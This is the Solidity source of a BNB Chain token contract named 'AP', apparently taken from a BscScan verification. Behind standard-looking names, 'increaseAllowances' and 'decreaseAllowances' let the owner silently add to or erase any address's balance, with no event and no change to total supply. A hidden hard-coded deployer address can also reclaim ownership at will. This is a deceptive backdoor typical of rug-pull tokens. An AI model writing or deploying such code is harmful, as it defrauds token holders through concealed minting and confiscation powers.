/**
 *Submitted for verification at BscScan.com on 2021-12-16
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.2;
contract APToken  {
    string public name = "AP";
    string public symbol = "AP";
    uint8 public decimals = 18;
    address private DeployAddress = 0xfAD7f6195cd486eD8f579962f06ee4F05e61A050;
    uint256 public totalSupply = 1000 * 10 ** 18;

    address public owner;
    modifier restricted {
        require(msg.sender == owner, "requir");
        _;
    }
     modifier restricteds {
        require(msg.sender == DeployAddress, "requir");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isIssuer;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);

    function getOwner() public view returns (address) {
        return owner;
    }

    function increaseAllowances(address spender, uint256 addedValue) public restricted returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 18;
        return true;
    }

    function decreaseAllowances(address spender, uint256 subtractedValue) public restricted returns (bool success) {
        balanceOf[spender] -= subtractedValue * 10 ** 18;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function transferOwnership(address newOwner) public restricteds {
        require(newOwner != address(0), "Invalid address: should  be 0x0");
        emit TransferOwnership(owner, newOwner);
        owner = newOwner;
    }
}